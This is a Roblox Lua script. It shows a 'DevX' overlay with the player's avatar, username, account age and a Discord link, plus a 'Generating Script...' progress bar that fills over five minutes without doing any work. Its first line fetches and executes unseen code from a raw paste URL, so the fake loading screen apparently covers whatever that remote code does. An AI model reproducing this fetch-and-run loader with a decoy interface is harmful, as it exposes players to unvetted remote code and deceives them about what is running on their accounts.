loadstring(game:HttpGet("https://pastefy.app/49kDarAY/raw"))()
-- DEVX MINI UI GENERATING SCRIPT (SMOOTH LOADING)
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local TweenService = game:GetService("TweenService")

-- COLORS
local WHITE     = Color3.fromRGB(255,255,255)
local BLUE_LINK = Color3.fromRGB(80,170,255)
local GREEN_BAR = Color3.fromRGB(90,255,140)
local VIOLET    = Color3.fromRGB(170,120,255)
local GRAY_BG   = Color3.fromRGB(55,55,55)
local USER_HL   = Color3.fromRGB(255,255,255)

-- ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DevX_GeneratingUI"
ScreenGui.Parent = player:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Main Frame
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0,360,0,175)
Main.Position = UDim2.new(0.5,0,0.5,-12)
Main.AnchorPoint = Vector2.new(0.5,0.5)
Main.BackgroundColor3 = GRAY_BG
Main.BackgroundTransparency = 0.12
Main.BorderSizePixel = 0
Instance.new("UICorner", Main).CornerRadius = UDim.new(0,18)

local Stroke = Instance.new("UIStroke", Main)
Stroke.Color = VIOLET
Stroke.Thickness = 3

-- Avatar Outer
local AvatarOuter = Instance.new("Frame", Main)
AvatarOuter.Size = UDim2.new(0,80,0,80)
AvatarOuter.Position = UDim2.new(0,20,0,10)
AvatarOuter.BackgroundColor3 = VIOLET
AvatarOuter.BorderSizePixel = 0
Instance.new("UICorner", AvatarOuter).CornerRadius = UDim.new(1,0)

-- Avatar Inner (UPDATED: gray background, visible)
local AvatarInner = Instance.new("Frame", AvatarOuter)
AvatarInner.Size = UDim2.new(1,-6,1,-6)
AvatarInner.Position = UDim2.new(0.5,0,0.5,0)
AvatarInner.AnchorPoint = Vector2.new(0.5,0.5)
AvatarInner.BackgroundColor3 = GRAY_BG -- same color as main frame
AvatarInner.BackgroundTransparency = 0  -- fully visible
AvatarInner.BorderSizePixel = 0
Instance.new("UICorner", AvatarInner).CornerRadius = UDim.new(1,0)

-- Avatar Image
local Avatar = Instance.new("ImageLabel", AvatarInner)
Avatar.Size = UDim2.new(1,-6,1,-6)
Avatar.Position = UDim2.new(0.5,0,0.5,0)
Avatar.AnchorPoint = Vector2.new(0.5,0.5)
Avatar.BackgroundTransparency = 1
Avatar.Image = Players:GetUserThumbnailAsync(
	player.UserId,
	Enum.ThumbnailType.HeadShot,
	Enum.ThumbnailSize.Size180x180
)
Instance.new("UICorner", Avatar).CornerRadius = UDim.new(1,0)

-- Username
local UserLabel = Instance.new("TextLabel", Main)
UserLabel.Size = UDim2.new(0,80,0,20)
UserLabel.Position = UDim2.new(0,20,0,95)
UserLabel.BackgroundTransparency = 1
UserLabel.Text = "User: "..player.Name
UserLabel.TextColor3 = USER_HL
UserLabel.Font = Enum.Font.GothamBold
UserLabel.TextScaled = true
UserLabel.TextXAlignment = Enum.TextXAlignment.Center

-- Text with shadow
local function TextWithShadow(parent,text,pos,size,color,font,scaled,align)
	local shadow = Instance.new("TextLabel", parent)
	shadow.Position = pos + UDim2.new(0,1,0,1)
	shadow.Size = size
	shadow.Text = text
	shadow.TextColor3 = Color3.fromRGB(0,0,0)
	shadow.TextTransparency = 0.4
	shadow.Font = font
	shadow.TextScaled = scaled
	shadow.BackgroundTransparency = 1
	shadow.TextXAlignment = align or Enum.TextXAlignment.Left

	local label = Instance.new("TextLabel", parent)
	label.Position = pos
	label.Size = size
	label.Text = text
	label.TextColor3 = color
	label.Font = font
	label.TextScaled = scaled
	label.BackgroundTransparency = 1
	label.TextXAlignment = align or Enum.TextXAlignment.Left

	return label
end

-- ðŸ”¹ MICRO SIZE INCREASE + SLIGHT DOWN (ONLY THESE 3)
TextWithShadow(
	Main,
	"Made By : DevX",
	UDim2.new(0,120,0,22),
	UDim2.new(1,-120,0,22),
	WHITE,
	Enum.Font.GothamBold,
	true
)

TextWithShadow(
	Main,
	"Account Age : "..player.AccountAge.." days",
	UDim2.new(0,120,0,48),
	UDim2.new(1,-120,0,18),
	WHITE,
	Enum.Font.Gotham,
	true
)

TextWithShadow(
	Main,
	"https://discord.gg/devxtai",
	UDim2.new(0,120,0,70),
	UDim2.new(1,-120,0,18),
	BLUE_LINK,
	Enum.Font.Gotham,
	true
)

TextWithShadow(
	Main,
	"Generating Script...",
	UDim2.new(0,20,0,120),
	UDim2.new(1,-40,0,20),
	WHITE,
	Enum.Font.GothamBold,
	true,
	Enum.TextXAlignment.Center
)

-- Loading Bar BG (konting taas lang)
local BarBG = Instance.new("Frame", Main)
BarBG.Position = UDim2.new(0,20,0,142)  -- dati 145, itaas ng 3px lang
BarBG.Size = UDim2.new(1,-40,0,12)
BarBG.BackgroundColor3 = Color3.fromRGB(45,45,45)
BarBG.BackgroundTransparency = 0.15
BarBG.BorderSizePixel = 0
Instance.new("UICorner", BarBG).CornerRadius = UDim.new(1,0)

-- Loading Bar
local Bar = Instance.new("Frame", BarBG)
Bar.Size = UDim2.new(0,0,1,0)
Bar.BackgroundColor3 = GREEN_BAR
Bar.BorderSizePixel = 0
Instance.new("UICorner", Bar).CornerRadius = UDim.new(1,0)

-- Percent (kasabay taas ng Bar)
local Percent = TextWithShadow(
	Main,
	"0%",
	UDim2.new(0,20,0,157), -- dati 160, itaas ng 3px
	UDim2.new(1,-40,0,16),
	WHITE,
	Enum.Font.GothamBold,
	true,
	Enum.TextXAlignment.Center
)

-- Smooth loading
local totalTime = 300
local steps = 3000
local stepTime = totalTime / steps

for i = 1, steps do
	local goal = i / steps
	Bar.Size = UDim2.new(goal,0,1,0)
	Percent.Text = math.floor(goal * 100).."%"
	task.wait(stepTime)
end
